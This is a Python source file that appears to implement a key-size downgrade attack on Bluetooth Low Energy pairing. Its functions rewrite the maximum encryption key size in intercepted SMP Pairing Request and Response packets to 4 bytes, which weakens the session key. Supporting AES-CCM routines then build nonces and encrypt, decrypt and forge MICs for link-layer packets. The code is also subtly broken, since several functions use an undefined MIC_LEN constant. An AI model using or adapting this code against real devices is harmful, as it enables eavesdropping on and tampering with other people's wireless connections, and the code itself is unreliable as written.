from Crypto.Cipher import AES


_SMP_CID = 0x0006
_SMP_PAIRING_REQ = 0x01
_SMP_PAIRING_RSP = 0x02
_MIC_LEN = 4  


def _hx(b: bytes) -> str:
    return ''.join(f'{x:02x}' for x in b)

def _rewrite_ll_l2cap_smp(ll_body: bytes, new_key_size: int = 0x04):
    """
    Rewrites SMP Pairing Req/Resp max enc size to new_key_size.
    """
    if len(ll_body) < 4:
        return ll_body, False

    llid = ll_body[0] & 0x03
    length = ll_body[1]
    # must have the whole payload present
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return ll_body, False

    # L2CAP header starts at offset 2
    l2cap = bytearray(ll_body[2:2+length])
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)

    # must be SMP CID and enough payload for Pairing Req/Rsp (len >= 7)
    if cid != _SMP_CID or l2len < 7 or len(l2cap) < 4 + l2len:
        return ll_body, False

    smp = bytearray(l2cap[4:4+l2len])
    smp_code = smp[0]
    if smp_code not in (_SMP_PAIRING_REQ, _SMP_PAIRING_RSP):
        return ll_body, False

    # Byte 4 of SMP Pairing Req/Rsp is Max Encryption Key Size
    if smp[4] == new_key_size:
        return ll_body, False  # nothing to change

    smp[4] = new_key_size
    l2cap[4:4+l2len] = smp

    # Reassemble LL body: [hdr,len] + L2CAP(payload)
    new_ll = bytearray(ll_body)
    new_ll[2:2+length] = l2cap  # length unchanged
    return bytes(new_ll), True


def  downgrade_pairing_response(packet_bytes: bytes, new_key_size: int = 0x04):
    """
    Downgrade entropy in the SMP Pairing Response packet by chaning max enc siwe to new_key_size
    """
    if len(packet_bytes) < 4:
        return packet_bytes, False
    event = packet_bytes[:2]
    ll_body = packet_bytes[2:]
    ll_body2, changed = _rewrite_ll_l2cap_smp(ll_body, new_key_size)
    return (event + ll_body2), changed


def downgrade_pairing_request(ll_body: bytes, new_key_size: int = 0x04):
    """
    Downgrade entropy in the SMP Pairing Response packet by chaning max enc siwe to new_key_size
    """
    return _rewrite_ll_l2cap_smp(ll_body, new_key_size)


def mask_ll_header_first_octet(hdr0: int) -> int:
    # Zero NESN, SN, MD bits (2,3,4)
    return hdr0 & ~0x1C



def aes128_ecb_encrypt(key: bytes, block: bytes) -> bytes:
    """
    AES-128 ECB encrypt a single 16-byte block with a 16-byte key.
    Returns the 16-byte ciphertext block.
    """
    if len(key) != 16:
        raise ValueError(f"AES-128 key must be 16 bytes, got {len(key)}")
    if len(block) != 16:
        raise ValueError(f"Plaintext block must be 16 bytes, got {len(block)}")
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(block)


def ble_ccm_encrypt(key: bytes,
                    nonce: bytes,
                    header_first_octet: int,
                    payload: bytes) -> tuple[bytes, bytes]:
    """
    Encrypt BLE LL payload compute MIC using AES-CCM.
    """
    assert len(key) == 16
    assert 7 <= len(nonce) <= 13      
    masked = mask_ll_header_first_octet(header_first_octet)

    cipher = AES.new(key,
                     AES.MODE_CCM,
                     nonce=nonce,
                     mac_len=4)       
    cipher.update(bytes([masked]))    

    ciphertext = cipher.encrypt(payload)
    tag = cipher.digest()             
    return ciphertext, tag

def make_ble_ccm_nonce(iv: bytes, packet_counter: int, direction_bit: int) -> bytes:
    """
    Construct the 13-byte BLE CCM nonce, nonce is provided LSO -> MSO (not as in the SPEC, but same convention as NIMBLE)
    """
    if not (0 <= packet_counter < (1 << 39)):
        raise ValueError("packet_counter must fit in 39 bits")
    if direction_bit not in (0, 1):
        raise ValueError("direction_bit must be 0 or 1")
    if len(iv) != 8:
        raise ValueError("iv must be exactly 8 bytes")

    # Lower 32 bits of packetCounter
    # Should have LSO of counter at nonce0 and second MSO at nonce3 (SPEC p2768) 
    n0 = (packet_counter >> 0) & 0xFF
    n1 = (packet_counter >> 8) & 0xFF
    n2 = (packet_counter >> 16) & 0xFF
    n3 = (packet_counter >> 24) & 0xFF

    # Upper 7 bits of packetCounter + direction in MSB forms nonce4 (SPEC p2768) 
    pc_high7 = (packet_counter >> 32) & 0x7F
    n4 = pc_high7 | (direction_bit << 7)

    # Should have MSO of IV at nonce12 and LSO at nonce5 (SPEC p2768) 
    # Index 0 is nonce0, index 13 is nonce 13 (SPEC p2768)
    return bytes([n0, n1, n2, n3, n4]) + iv


def make_ble_ccm_counter_block(nonce: bytes, block_index: int) -> bytes:
    """
    Construct the 16-byte AES-CTR counter block A_i used by AES-CCM in BLE.
    """
    if len(nonce) != 13:
        raise ValueError("nonce must be exactly 13 bytes for BLE CCM")
    if not (0 <= block_index <= 0xFFFF):
        raise ValueError("block_index must fit in 16 bits")

    L = 15 - len(nonce)   # BLE => 2
    flags = (L - 1)       # BLE => 0x01
    
    ctr_msb = (block_index >> 8) & 0xFF  # A[14]
    ctr_lsb = block_index & 0xFF         # A[15]
    
    # nonce should have nonce0 at position 1 and nonce13 at position 14 (SPEC p2769)
    return bytes([flags]) + nonce + bytes([ctr_msb, ctr_lsb])
    


def compute_ble_ccm_encrypted_mic(session_key: bytes,
                                  nonce: bytes,
                                  header_first_octet: int,
                                  plaintext: bytes) -> bytes:
    """
    Compute the *encrypted* MIC (the 4 bytes you see on-air) for BLE LL Data PDU.

    - session_key: 16-byte AES-CCM session key (AES_LTK(SKD))
    - nonce: 13-byte BLE CCM nonce (your make_ble_ccm_nonce output)
    - header_first_octet: original pdu[0] before masking bits
    - plaintext: payload bytes (decrypted; without MIC)

    Returns: 4-byte encrypted MIC (U) to compare with on-air MIC.
    """

    if len(nonce) != 13:
        raise ValueError("nonce must be 13 bytes")

    payload_len = len(plaintext)

    # -------- B0: flags + nonce + payload length --------
    # BLE: M = 4, L = 2  → flags = 0x49 (per spec, Table 2.2)
    #   - bits for (M, L) pre-encoded as 0x49
    #   - Length field is "length of payload", NOT payload+MIC
    B0 = bytes([0x49]) + nonce + bytes([0x00, payload_len & 0xFF])

    # -------- B1: AAD = masked first header octet --------
    # AAD length = 1 byte: 0x0001
    # AAD = header[0] with NESN, SN, MD bits masked to zero.
    #   NESN bit = 2, SN bit = 3, MD bit = 4  → mask 0b00011100 = 0x1C
    NESN_SN_MD_MASK = (1 << 2) | (1 << 3) | (1 << 4)
    aad_byte = header_first_octet & ~NESN_SN_MD_MASK

    B1 = bytes([
        0x00,               # AAD length MSB
        0x01,               # AAD length LSB (1 byte of AAD)
        aad_byte            # AAD (masked header octet)
    ]) + bytes(13)          # padding to 16 bytes total

    # -------- Payload blocks B2..Bn (CBC-MAC) --------
    # According to CCM, we MAC the plaintext payload, padded with zeros.
    payload_blocks = []
    offset = 0
    while offset < payload_len:
        block = plaintext[offset:offset + 16]
        if len(block) < 16:
            block = block + bytes(16 - len(block))  # zero pad
        payload_blocks.append(block)
        offset += 16

    # CBC-MAC: Y0 = 0^128; Yi = AES(K, Yi-1 XOR Bi)
    Y = bytes(16)  # 16 zero bytes
    for block in [B0, B1] + payload_blocks:
        xored = bytes(a ^ b for a, b in zip(Y, block))
        Y = aes128_ecb_encrypt(session_key, xored)

    # T = Y (full 16 bytes), MIC = first 4 bytes
    T = Y
    T_trunc = T[:MIC_LEN]

    # -------- Encrypt MIC using A0 (counter block i = 0) --------
    A0 = make_ble_ccm_counter_block(nonce, block_index=0)
    S0 = aes128_ecb_encrypt(session_key, A0)

    encrypted_mic = bytes(a ^ b for a, b in zip(T_trunc, S0[:MIC_LEN]))
    return encrypted_mic


def ble_ccm_decrypt(session_key: bytes, iv: bytes, packet_counter: int, direction_bit: int, pdu: bytes):
    """
    Decrypt BLE LL Data PDU using PyCryptodome AES-CCM and verify MIC.

    PDU format:
        [hdr0][length][ciphertext_payload || encrypted_MIC]

    Returns:
        (plaintext_payload, mic_ok)   on success
        (None, False)                on error
    """

    mic_ok = False
    NESN_SN_MD_MASK = (1 << 2) | (1 << 3) | (1 << 4)  

    if len(pdu) < 2:
        print("[CCM] PDU too short")
        return None, False

    hdr0 = pdu[0]
    length = pdu[1]

    # No payload, nothing to decrypt/MIC
    if length == 0:
        print("Empty packet, should not be decrypted")
        return None, False 

    if len(pdu) < 2 + length:
        print(f"[CCM] Truncated PDU: len={len(pdu)}, header length={length}")
        return None, False

    payload_plus_mic = pdu[2:2 + length]

    if len(payload_plus_mic) <= MIC_LEN:
        print("[CCM] payload too short (no data, only MIC?)")
        return None, False

    ciphertext = payload_plus_mic[:-MIC_LEN]
    mic = payload_plus_mic[-MIC_LEN:]

    # BLE nonce: 13 bytes constructed from packetCounter + direction + IV
    nonce = make_ble_ccm_nonce(iv, packet_counter, direction_bit)

    # AAD is 1 byte: hdr0 with NESN/SN/MD bits masked to 0
    aad_byte = hdr0 & ~NESN_SN_MD_MASK
    aad = bytes([aad_byte])

    # Now let the library do CCM (MAC+CTR) for us
    try:
        cipher = AES.new(session_key, AES.MODE_CCM, nonce=nonce, mac_len=MIC_LEN)
        cipher.update(aad)                         
        plaintext = cipher.decrypt_and_verify(ciphertext, mic)
        mic_ok = True
    except ValueError as e:
        # MIC failure, or other CCM issue
        print(f"[CCM] MIC verification FAILED: {e}")
        return None, False

    return plaintext, mic_ok

